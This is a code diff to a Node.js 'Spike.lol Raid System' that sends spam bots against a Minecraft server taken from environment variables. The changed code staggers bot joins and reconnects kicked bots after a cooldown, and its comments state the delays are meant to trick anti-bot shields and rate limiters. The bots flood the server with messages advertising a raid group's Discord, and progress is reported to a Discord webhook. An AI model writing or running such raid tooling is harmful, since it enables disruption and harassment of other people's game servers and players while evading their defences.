@@ -1,15 +1,24 @@
 const { createSpikeBot } = require('./bot');
-const config = require('./config.json');
 const http = require('http');
 
-// Simple web server to keep Render.com alive
+// Render Environment Variables (Direct Extraction)
+const TARGET_IP = process.env.TARGET_IP;
+const TARGET_PORT = process.env.TARGET_PORT ? parseInt(process.env.TARGET_PORT) : 25565;
+const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+const BOT_PASSWORD = process.env.BOT_PASSWORD || "SpikePass123";
+
+const spamMessages = [
+    "SPIKE.LOL ON TOP! THIS SERVER RAID BY SPIKE.LOL FREE TOOLS AND MORE RAID SYSTEM BEST JOIN https://discord.gg/pT8RGGvtZg"
+];
+
+// Keep Render alive web server
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => res.writeHead(200).end('Spike Raid Bot is Active!')).listen(PORT);
 
 async function sendWebhook(message) {
-    if (!config.webhookUrl || config.webhookUrl.includes('YOUR_DISCORD_WEBHOOK')) return;
+    if (!WEBHOOK_URL) return;
     try {
-        await fetch(config.webhookUrl, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: message })
@@ -17,21 +26,24 @@ async function sendWebhook(message) {
     } catch (e) {}
 }
 
+if (!TARGET_IP || TARGET_IP.includes('your-target-server')) {
+    console.error("❌ ERROR: TARGET_IP sahi se set nahi hai Render Environment variables me!");
+    process.exit(1);
+}
+
 let activeBots = [];
 let isRaidActive = true;
-let sleepModeActive = false;
-let offlineMinutesCount = 0;
 
-console.log(`🚀 Starting Spike.lol Raid System targeting ${config.target.ip}:${config.target.port}`);
-sendWebhook(`🚀 **Raid System Started!** Target: \`${config.target.ip}:${config.target.port}\``);
+console.log(`🚀 Starting Spike.lol Raid System targeting ${TARGET_IP}:${TARGET_PORT}`);
+sendWebhook(`🚀 **Raid System Started!** Target: \`${TARGET_IP}:${TARGET_PORT}\``);
 
+// 🛡️ Anti-Bot Shield Bypass Queue (Ek-ek karke smart join system)
 function launchRaidBots() {
     if (!isRaidActive) return;
 
     let spawnedCount = 0;
-    // Har 5 seconds me ek bot join karega taaki anti-bot trigger na ho
     const joinInterval = setInterval(() => {
-        if (!isRaidActive || spawnedCount >= 3) { // Max 3 bots safe side ke liye
+        if (!isRaidActive || spawnedCount >= 3) { // Safe limit: Max 3 bots concurrent
             clearInterval(joinInterval);
             return;
         }
@@ -39,45 +51,36 @@ function launchRaidBots() {
         const randomSuffix = Math.floor(1000 + Math.random() * 9000);
         const botName = `spikelol_${randomSuffix}`;
 
-        try {
-            const bot = createSpikeBot(botName, config, sendWebhook);
+        // Config object passed to bot.js
+        const botConfig = {
+            target: { ip: TARGET_IP, port: TARGET_PORT },
+            auth: { password: BOT_PASSWORD },
+            spamMessages: spamMessages
+        };
 
+        try {
+            const bot = createSpikeBot(botName, botConfig, sendWebhook);
+
+            // Agar server kick kare ya shield detect kare, toh thoda lamba delay deke dobara bhejo
             bot.on('end', (reason) => {
                 activeBots = activeBots.filter(b => b !== bot);
-                // Agar kick ya ECONNRESET mila toh turant dobara mat ghusa, 5s ruk ke try kar
-                if (isRaidActive && !sleepModeActive) {
+                if (isRaidActive) {
                     setTimeout(() => {
                         if (isRaidActive) {
                             const newSuffix = Math.floor(1000 + Math.random() * 9000);
-                            const replacementBot = createSpikeBot(`spikelol_${newSuffix}`, config, sendWebhook);
+                            const replacementBot = createSpikeBot(`spikelol_${newSuffix}`, botConfig, sendWebhook);
                             activeBots.push(replacementBot);
                         }
-                    }, 5000); 
+                    }, 8000); // 8 seconds cooldown to bypass anti-bot rate limiter
                 }
             });
 
             activeBots.push(bot);
             spawnedCount++;
         } catch (e) {
-            handleServerOffline();
+            console.log("Connection error caught.");
         }
-    }, 5000); // 5 seconds gap between each bot join
-}
-
-function handleServerOffline() {
-    if (sleepModeActive) return;
-    offlineMinutesCount++;
-    if (offlineMinutesCount >= 40) {
-        sleepModeActive = true;
-        sendWebhook(`💤 Server seems offline/unavailable. Entering **Sleep Mode** for 50 minutes.`);
-        
-        setTimeout(() => {
-            sleepModeActive = false;
-            offlineMinutesCount = 0;
-            sendWebhook(`🔔 Woke up from Sleep Mode. Retrying connection...`);
-            if (isRaidActive) launchRaidBots();
-        }, 50 * 60 * 1000);
-    }
+    }, 4000); // 4 seconds gap between each bot join to trick anti-bot shields
 }
 
 // Initial Launch
